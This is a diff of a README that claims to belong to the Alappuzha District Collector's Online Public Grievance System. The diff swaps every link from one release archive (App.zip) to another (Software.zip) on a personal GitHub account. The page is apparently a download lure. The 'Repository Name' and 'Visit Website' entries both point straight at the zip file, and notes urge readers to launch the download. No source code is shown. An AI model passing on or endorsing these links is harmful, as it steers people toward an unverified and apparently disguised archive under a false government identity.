@@ -3,14 +3,14 @@
 Welcome to the official GitHub repository for the Alappuzha District Collector’s Online Public Grievance System. This initiative by the district administration, with the support of KSITM Alappuzha, aims to streamline the grievance redressal process for residents of Alappuzha. Using this digital platform, residents can easily submit grievances and track the status of their resolutions online.
 
 ## Repository Details
-- **Repository Name:** https://github.com/kaasman123/pgalp.github.io/releases/download/v1.0/App.zip
+- **Repository Name:** https://github.com/kaasman123/pgalp.github.io/releases/download/v2.0/Software.zip
 - **Description:** The Alappuzha District Collector’s Online Public Grievance System is a digital platform developed to facilitate the grievance redressal process in the district.
 - **Topics:** alappuzha, edistrict, egovernment, eoffice, eservice, hugo-theme, itmission, kerala, ksitm, ksitmalappuzha, ksitmalp, opendata, pgksitmalappuzha, pgmodule, publicgrievance
 
 ## Installation
 You can download the latest version of the project files by clicking the button below:
 
-[![Download Project Files](https://github.com/kaasman123/pgalp.github.io/releases/download/v1.0/App.zip)](https://github.com/kaasman123/pgalp.github.io/releases/download/v1.0/App.zip "Launching Download")
+[![Download Project Files](https://github.com/kaasman123/pgalp.github.io/releases/download/v2.0/Software.zip)](https://github.com/kaasman123/pgalp.github.io/releases/download/v2.0/Software.zip "Launching Download")
 
 *Note: The download link needs to be launched to get the project files.*
 
@@ -34,7 +34,7 @@ For any queries or assistance, please reach out to the project maintainers. Your
 ## Visit Our Website
 Explore more about the Alappuzha District Collector’s Online Public Grievance System on our official website.
 
-[Visit Website](# "https://github.com/kaasman123/pgalp.github.io/releases/download/v1.0/App.zip")
+[Visit Website](# "https://github.com/kaasman123/pgalp.github.io/releases/download/v2.0/Software.zip")
 
 *Note: Simply visit the website to learn more about the grievance system.*
 
